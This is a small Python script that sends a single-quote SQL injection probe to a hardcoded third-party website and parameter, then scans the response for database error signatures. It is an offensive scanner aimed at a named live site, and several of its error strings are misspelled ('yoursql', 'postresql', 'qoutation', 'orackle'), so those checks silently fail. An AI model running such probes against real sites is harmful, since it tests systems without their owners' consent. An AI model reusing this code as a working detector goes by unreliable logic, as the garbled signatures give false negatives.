import sys 
import requests

# dictionary of database error signature to search for in the response
SQLI_ERRORS = {
    "MySQL": ["you have an error in yoursql syntax", "warning mysql", "check the manual that corresponds to your sql"],
    "PostgreSQL": ["pg_py_error", "postresql query failed", "severity: error"],
    "Microsoft SQL Server": ["unclosed qoutation mark after the character string", "driver odbc microsoft sql server"],
    "Oracle": ["ora-00933", "orackle error", "ora-01756"]
}

def scan_sql_injection(url, parameter):
    """
    Tests a specific URL parameter for SQL injection vulnerabilities.
    """
    # define a malicious payload designed to break a SQL syntax
    payload = "'"

    # construct the target URL with the payload injected into the parameter
    target_url = f"{url}?{parameter}={payload}"
    print(f"[*] Testing target URL: {target_url}")

    try:
        # send the GET request URL with a generic browser user-agent
        headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}
        response = requests.get(target_url, headers=headers, timeout=10)

        # convert response text to lowercase for case-insensitive matching
        response_text = response.text.lower()

        # check response the web page content for known database errors
        vulnerable = False
        for db_name, errors in SQLI_ERRORS.items():
            for error in errors:
                if error in response_text:
                    print(f"[\u2705] VULNERABLE! Found {db_name} error signature: '{error}'")
                    vulnerable = True
                    break

        if not vulnerable:
            print("[\u274c] No obvious SQL errors detected with a single quote payload.")

    except requests.exceptions.RequestException as e:
        print(f"[\u26a0\ufe0f] Error connecting to the websites: {e}")

if __name__ == "__main__":
    # define target website details
    target_domain = "https://mrnetwork.tech"
    target_parameter = "dn=mrnetwork.tech&sksubid"

    scan_sql_injection(target_domain, target_parameter)                        